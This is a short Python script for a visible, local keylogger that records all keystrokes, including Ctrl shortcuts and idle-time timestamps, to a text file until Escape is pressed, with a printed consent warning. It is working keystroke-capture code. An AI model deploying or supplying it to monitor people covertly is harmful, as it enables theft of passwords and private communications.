import os
import sys
import time
from pynput.keyboard import Key, Listener

# File to store the logged keys
log_file = "key_log.txt"

# Track time for session detection (idle detection)
last_pressed_time = time.time()
PAUSE_THRESHOLD = 5.0  # seconds (adds timestamp after this duration of inactivity)

print("====================================================")
print("               SIMPLE KEYLOGGER                     ")
print("====================================================")
print("[WARNING] This program is for educational and authorized")
print("          testing purposes only. Monitoring keystrokes")
print("          without explicit consent is illegal.")
print("----------------------------------------------------")
print(f"[*] Keystrokes are being logged to: {os.path.abspath(log_file)}")
print("[*] Press 'Escape' key to stop logging.")
print("====================================================")

def write_to_file(key_str):
    """Appends keystrokes to the log file."""
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key_str)
            f.flush()
    except Exception as e:
        print(f"\n[ERROR] Failed to write to log file: {e}", file=sys.stderr)

def on_press(key):
    """Callback triggered on key press."""
    global last_pressed_time
    
    current_time = time.time()
    
    # Detect inactivity pause and insert a timestamp
    if current_time - last_pressed_time > PAUSE_THRESHOLD:
        write_to_file(f"\n\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] ")
    
    last_pressed_time = current_time

    try:
        # Log character keys
        if key.char is not None:
            # Handle control character shortcuts (e.g., Ctrl+C, Ctrl+V)
            # Control characters fall in ASCII values 1-26 when Ctrl is held down
            ascii_val = ord(key.char)
            if ascii_val < 32 and ascii_val not in (9, 10, 13):  # Exclude Tab, LF, CR
                ctrl_char = chr(ascii_val + 96).upper()
                write_to_file(f"[CTRL+{ctrl_char}]")
            else:
                write_to_file(key.char)
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            write_to_file(" ")
        elif key == Key.enter:
            write_to_file("\n")
        elif key == Key.tab:
            write_to_file("\t")
        elif key == Key.backspace:
            write_to_file("[BACKSPACE]")
        elif key in [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r]:
            # Skip standalone modifier keys to keep the log file clean
            pass
        else:
            write_to_file(f"[{key.name.upper()}]")

def on_release(key):
    """Callback triggered on key release. Exits if Escape is pressed."""
    if key == Key.esc:
        print("\n[INFO] Exiting keylogger cleanly.")
        write_to_file(f"\n--- Session Stopped: {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        return False

if __name__ == "__main__":
    try:
        # Log session start
        write_to_file(f"\n--- Session Started: {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        
        # Start the listener
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[INFO] Keylogger stopped by user interrupt.")
        write_to_file(f"\n--- Session Interrupted: {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred: {e}", file=sys.stderr)

